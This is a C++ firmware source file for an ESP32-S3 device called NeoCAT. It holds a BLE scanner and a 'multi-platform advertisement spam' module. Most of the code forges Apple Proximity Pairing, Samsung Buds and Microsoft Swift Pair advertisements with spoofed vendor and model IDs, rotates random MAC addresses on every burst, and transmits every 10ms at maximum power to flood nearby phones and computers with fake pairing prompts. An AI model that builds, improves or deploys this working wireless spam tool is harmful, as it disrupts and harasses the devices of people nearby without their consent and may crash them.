/**
 * ble_module.cpp - NeoCAT v1 BLE Module (Fixed for ESP32-S3)
 * 
 * Full implementation of BLE scanning and multi-platform
 * advertisement spam using the NimBLE stack.
 * 
 * Key fixes:
 * - Proper error checking on all NimBLE calls
 * - Non-connectable advertising mode for spam
 * - Correct manufacturer data format (company ID as first 2 bytes)
 * - Faster spam interval (10ms instead of 20ms)
 * - Address randomization between each burst
 */

#include "ble_module.h"

// ═══════════════════════════════════════════════════════════════
//  Apple device model IDs
// ═══════════════════════════════════════════════════════════════
static const uint16_t APPLE_MODELS[] = {
  0x0220,  // AirPods
  0x0E20,  // AirPods Pro
  0x0A20,  // AirPods Max
  0x1320,  // AirPods 3rd Gen
  0x0520,  // Beats Studio
  0x1020,  // Beats Flex
  0x0620,  // Beats Solo3
  0x0320,  // Powerbeats3
  0x1420,  // AirPods Pro 2nd Gen
};
static const size_t APPLE_MODEL_COUNT = sizeof(APPLE_MODELS) / sizeof(APPLE_MODELS[0]);

// Manufacturer company IDs (Bluetooth SIG)
static const uint16_t APPLE_CID   = 0x004C;
static const uint16_t SAMSUNG_CID = 0x0075;
static const uint16_t MS_CID      = 0x0006;

// Spam interval in milliseconds (lower = faster)
static const unsigned long SPAM_INTERVAL_MS = 10;

// ═══════════════════════════════════════════════════════════════
//  NimBLE scan callback
// ═══════════════════════════════════════════════════════════════
class ScanCB : public NimBLEScanCallbacks {
public:
  std::vector<BLEDeviceInfo>* devs;
  ScanCB(std::vector<BLEDeviceInfo>* d) : devs(d) {}

  void onResult(const NimBLEAdvertisedDevice* dev) override {
    String addr = String(dev->getAddress().toString().c_str());
    // Update existing
    for (auto& d : *devs) {
      if (d.address == addr) {
        d.rssi = dev->getRSSI();
        d.lastSeen = millis();
        return;
      }
    }
    BLEDeviceInfo info;
    info.address  = addr;
    info.rssi     = dev->getRSSI();
    info.lastSeen = millis();
    info.isPublic = (dev->getAddressType() == BLE_ADDR_PUBLIC);
    info.name = dev->haveName() ? String(dev->getName().c_str()) : "Unknown";

    if (dev->haveManufacturerData()) {
      std::string mfr = dev->getManufacturerData();
      if (mfr.size() >= 2) {
        uint16_t cid = (uint16_t)mfr[0] | ((uint16_t)mfr[1] << 8);
        switch (cid) {
          case 0x004C: info.manufacturer = "Apple";     break;
          case 0x0075: info.manufacturer = "Samsung";   break;
          case 0x0006: info.manufacturer = "Microsoft"; break;
          case 0x00E0: info.manufacturer = "Google";    break;
          default: {
            char buf[12]; snprintf(buf, sizeof(buf), "0x%04X", cid);
            info.manufacturer = String(buf);
          }
        }
      } else { info.manufacturer = "N/A"; }
    } else { info.manufacturer = "N/A"; }
    devs->push_back(info);
  }

  void onScanEnd(const NimBLEScanResults& results, int reason) override {
    Serial.printf("[BLE] Scan ended, reason: %d, %d devices\n", reason, (int)devs->size());
  }
};

static ScanCB* _scanCb = nullptr;

// ═══════════════════════════════════════════════════════════════
//  Public API
// ═══════════════════════════════════════════════════════════════
void BLEModule::begin() {
  Serial.println("[BLE] Initializing NimBLE...");
  if (!NimBLEDevice::init("NeoCAT")) {
    Serial.println("[BLE] ERROR: NimBLE init failed!");
    return;
  }
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Max TX power
  _pAdvertising = NimBLEDevice::getAdvertising();
  if (!_pAdvertising) {
    Serial.println("[BLE] ERROR: Failed to get advertising handle!");
    return;
  }
  Serial.println("[BLE] Module ready.");
}

void BLEModule::startScan(int duration) {
  if (_scanning) return;
  if (_spamming) { stopSpam(); delay(50); }

  _devices.clear();
  _scanDuration  = duration;
  _scanStartTime = millis();
  _scanning      = true;

  if (_scanCb) delete _scanCb;
  _scanCb = new ScanCB(&_devices);

  NimBLEScan* pScan = NimBLEDevice::getScan();
  pScan->setScanCallbacks(_scanCb);
  pScan->setActiveScan(true);
  pScan->setInterval(100);
  pScan->setWindow(99);
  pScan->setDuplicateFilter(false);

  if (!pScan->start(0, false)) {
    Serial.println("[BLE] ERROR: Scan start failed!");
    _scanning = false;
    return;
  }
  Serial.printf("[BLE] Scan started (%ds)\n", duration);
}

bool BLEModule::isScanning()        { return _scanning; }
bool BLEModule::isSpamming()        { return _spamming; }
BLESpamType BLEModule::getSpamType(){ return _spamType; }
uint32_t BLEModule::getSpamCount()  { return _spamCount; }
int BLEModule::getDeviceCount()     { return (int)_devices.size(); }

void BLEModule::startSpam(BLESpamType type) {
  if (_scanning) {
    NimBLEDevice::getScan()->stop();
    _scanning = false;
    delay(50);
  }
  _spamType     = type;
  _spamming     = true;
  _spamCount    = 0;
  _lastSpamTime = 0;

  // Set to random address type for address spoofing
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);

  // Set non-connectable mode for spam (important!)
  if (_pAdvertising) {
    _pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    _pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
  }

  Serial.printf("[BLE] Spam started: type=%d\n", (int)type);
}

void BLEModule::stopSpam() {
  if (!_spamming) return;
  if (_pAdvertising) _pAdvertising->stop();
  _spamming = false;
  _spamType = BLE_SPAM_NONE;
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
  Serial.printf("[BLE] Spam stopped. %u packets\n", _spamCount);
}

// ═══════════════════════════════════════════════════════════════
//  Update loop
// ═══════════════════════════════════════════════════════════════
void BLEModule::update() {
  unsigned long now = millis();

  if (_scanning) {
    if ((now - _scanStartTime) >= (unsigned long)(_scanDuration * 1000)) {
      NimBLEDevice::getScan()->stop();
      _scanning = false;
      Serial.printf("[BLE] Scan done — %d devices\n", (int)_devices.size());
    }
    return;
  }

  if (_spamming && (now - _lastSpamTime >= SPAM_INTERVAL_MS)) {
    _lastSpamTime = now;
    switch (_spamType) {
      case BLE_SPAM_APPLE:   _sendAppleSpam();   break;
      case BLE_SPAM_SAMSUNG: _sendSamsungSpam();  break;
      case BLE_SPAM_WINDOWS: _sendWindowsSpam();  break;
      case BLE_SPAM_ALL: {
        uint32_t phase = _spamCount % 3;
        if (phase == 0)      _sendAppleSpam();
        else if (phase == 1) _sendSamsungSpam();
        else                 _sendWindowsSpam();
        break;
      }
      default: break;
    }
  }
}

// ═══════════════════════════════════════════════════════════════
//  JSON output
// ═══════════════════════════════════════════════════════════════

const BLEDeviceInfo* BLEModule::getDevice(int index) const {
  if (index < 0 || index >= (int)_devices.size()) return nullptr;
  return &_devices[index];
}

String BLEModule::getScanResultsJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (auto& d : _devices) {
    JsonObject obj = arr.add<JsonObject>();
    obj["name"]    = d.name;
    obj["address"] = d.address;
    obj["rssi"]    = d.rssi;
    obj["manufacturer"] = d.manufacturer;
    obj["isPublic"] = d.isPublic;
    obj["lastSeen"] = d.lastSeen;
  }
  String out; serializeJson(doc, out); return out;
}

String BLEModule::getStatusJSON() {
  JsonDocument doc;
  doc["scanning"]    = _scanning;
  doc["spamming"]    = _spamming;
  doc["spamType"]    = (int)_spamType;
  doc["spamCount"]   = _spamCount;
  doc["deviceCount"] = (int)_devices.size();
  String out; serializeJson(doc, out); return out;
}

// ═══════════════════════════════════════════════════════════════
//  Spam generators — fixed with proper error checking
// ═══════════════════════════════════════════════════════════════

void BLEModule::_sendAppleSpam() {
  if (!_pAdvertising) return;
  _pAdvertising->stop();

  uint8_t rndAddr[6];
  _generateRandomAddr(rndAddr);
  NimBLEDevice::setOwnAddr(rndAddr);

  uint16_t model = APPLE_MODELS[esp_random() % APPLE_MODEL_COUNT];

  // Apple Proximity Pairing: Company ID (2) + type(1) + len(1) + data(23) = 27 bytes
  // Total ADV: 2(len+type) + 27(mfg data) = 29 bytes — fits in 31-byte limit
  uint8_t data[27];
  data[0] = (uint8_t)(APPLE_CID & 0xFF);         // Company ID low
  data[1] = (uint8_t)(APPLE_CID >> 8);           // Company ID high
  data[2] = 0x07;                                // Proximity Pairing type
  data[3] = 0x19;                                // Length (25 bytes follow)
  data[4] = 0x07;                                // Status: new device
  data[5] = (uint8_t)(model >> 8);               // Model high (Big Endian)
  data[6] = (uint8_t)(model & 0xFF);             // Model low
  data[7] = (uint8_t)(esp_random() % 100);       // Status / Battery pseudo-random
  for (int i = 8; i < 27; i++) data[i] = (uint8_t)(esp_random() & 0xFF);

  NimBLEAdvertisementData advData;
  // No flags — saves 3 bytes, Apple devices don't need them
  if (!advData.setManufacturerData(data, sizeof(data))) {
    Serial.println("[BLE] Apple: setMfgData failed");
    return;
  }

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->setScanResponseData(NimBLEAdvertisementData());

  if (!_pAdvertising->start(0)) {
    Serial.println("[BLE] Apple: start failed");
    return;
  }
  _spamCount++;
}

void BLEModule::_sendSamsungSpam() {
  if (!_pAdvertising) return;
  _pAdvertising->stop();

  uint8_t rndAddr[6];
  _generateRandomAddr(rndAddr);
  NimBLEDevice::setOwnAddr(rndAddr);

  // Samsung: Company ID (2) + nearby type(1) + len(1) + device(1) + random(5) = 10 bytes
  // Total ADV: 3(flags) + 2(len+type) + 10(data) = 15 bytes — room for short name
  uint8_t data[10];
  data[0] = (uint8_t)(SAMSUNG_CID & 0xFF);
  data[1] = (uint8_t)(SAMSUNG_CID >> 8);
  data[2] = 0x42;  // Samsung nearby type
  data[3] = 0x04;  // Length
  data[4] = 0x01;  // Earbuds type
  for (int i = 5; i < 10; i++) data[i] = (uint8_t)(esp_random() & 0xFF);

  NimBLEAdvertisementData advData;
  advData.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);
  if (!advData.setManufacturerData(data, sizeof(data))) {
    Serial.println("[BLE] Samsung: setMfgData failed");
    return;
  }

  // Short names that fit in remaining bytes (31 - 15 = 16 bytes, minus 2 overhead = 14 chars max)
  static const char* NAMES[] = { "Buds Pro", "Buds Live", "Buds2", "GalaxyBuds" };
  advData.setShortName(NAMES[esp_random() % 4]);

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->setScanResponseData(NimBLEAdvertisementData());

  if (!_pAdvertising->start(0)) {
    Serial.println("[BLE] Samsung: start failed");
    return;
  }
  _spamCount++;
}

void BLEModule::_sendWindowsSpam() {
  if (!_pAdvertising) return;
  _pAdvertising->stop();

  uint8_t rndAddr[6];
  _generateRandomAddr(rndAddr);
  NimBLEDevice::setOwnAddr(rndAddr);

  // Microsoft Swift Pair: Company ID (2) + beacon(1) + scenario(1) + random(4) = 8 bytes
  // Total ADV: 3(flags) + 2+8(mfg) + 2+6(name) = 21 bytes — fits
  uint8_t data[8];
  data[0] = (uint8_t)(MS_CID & 0xFF);
  data[1] = (uint8_t)(MS_CID >> 8);
  data[2] = 0x03;  // Swift Pair beacon
  data[3] = 0x01;  // Scenario: BLE pairing
  for (int i = 4; i < 8; i++) data[i] = (uint8_t)(esp_random() & 0xFF);

  NimBLEAdvertisementData advData;
  advData.setFlags(BLE_HS_ADV_F_DISC_GEN | BLE_HS_ADV_F_BREDR_UNSUP);
  if (!advData.setManufacturerData(data, sizeof(data))) {
    Serial.println("[BLE] Windows: setMfgData failed");
    return;
  }

  static const char* NAMES[] = { "KB Pro", "Mouse", "Buds", "Pad" };
  advData.setName(NAMES[esp_random() % 4]);

  _pAdvertising->setAdvertisementData(advData);
  _pAdvertising->setScanResponseData(NimBLEAdvertisementData());

  if (!_pAdvertising->start(0)) {
    Serial.println("[BLE] Windows: start failed");
    return;
  }
  _spamCount++;
}

// ═══════════════════════════════════════════════════════════════
//  Utility
// ═══════════════════════════════════════════════════════════════
void BLEModule::_generateRandomAddr(uint8_t* addr) {
  uint32_t r1 = esp_random();
  uint32_t r2 = esp_random();
  addr[0] = (uint8_t)((r1 >>  0) & 0xFF) | 0xC0;  // Static random
  addr[1] = (uint8_t)((r1 >>  8) & 0xFF);
  addr[2] = (uint8_t)((r1 >> 16) & 0xFF);
  addr[3] = (uint8_t)((r1 >> 24) & 0xFF);
  addr[4] = (uint8_t)((r2 >>  0) & 0xFF);
  addr[5] = (uint8_t)((r2 >>  8) & 0xFF);
}
